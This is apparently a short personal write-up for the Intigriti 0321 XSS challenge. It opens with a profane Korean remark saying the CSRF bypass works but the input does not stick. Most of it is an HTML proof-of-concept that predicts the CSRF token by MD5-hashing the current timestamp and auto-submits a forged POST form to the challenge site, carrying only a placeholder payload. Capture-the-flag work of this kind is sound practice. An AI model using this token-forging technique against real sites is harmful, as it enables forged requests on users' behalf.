# POC

아 ^^ㅣ발 진짜 csrf token 우회 했는데 입력값이 안 박힌다;;

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Intigriti 0321 Poc</title>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
        <script>
            // Reference : https://webisfree.com/2017-10-18/%EC%9E%90%EB%B0%94%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8A%B8-%ED%98%84%EC%9E%AC-%EC%8B%9C%EA%B0%84-timestamp-%EC%96%BB%EB%8A%94-%EB%B0%A9%EB%B2%95
            const exploit = function(){
                hash = md5(Math.floor(new Date().getTime() / 1000) + 2);
                payload = "pocas";
                document.getElementById('csrf_').value = hash;
                document.getElementById('notes_').value = payload;
                document.getElementById('base_form').submit();
            }       
        </script>
    </head>
    <body>
        <h1>Intigriti XSS Challenge 0321</h1>
        
        <h3>If you click the button below and execute poc code, You can trigger the xss.</h3>
        <form id="base_form" action="https://challenge-0321.intigriti.io/" method="POST">
            <input type="hidden" name="csrf" id="csrf_" value="">
            <input type="hidden" name="notes" id="notes_" value="">
            <input type="button" onclick=exploit() value="Trigger">
        </form>
    </body>
</html>
```
